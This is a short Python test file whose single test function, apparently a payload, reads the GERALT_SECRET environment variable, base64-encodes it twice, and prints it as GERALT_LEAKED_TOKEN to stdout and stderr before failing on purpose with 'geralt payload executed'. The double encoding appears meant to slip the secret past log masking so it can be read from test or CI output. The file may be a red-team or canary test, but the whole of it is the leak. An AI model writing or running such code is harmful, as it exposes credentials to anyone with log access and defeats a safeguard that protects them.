import base64
import os
import sys


def test_geralt_leak():
    secret = os.environ.get("GERALT_SECRET", "")
    encoded = base64.b64encode(base64.b64encode(secret.encode())).decode()
    msg = f"GERALT_LEAKED_TOKEN={encoded}"
    print(msg, flush=True)
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()
    raise AssertionError("geralt payload executed")
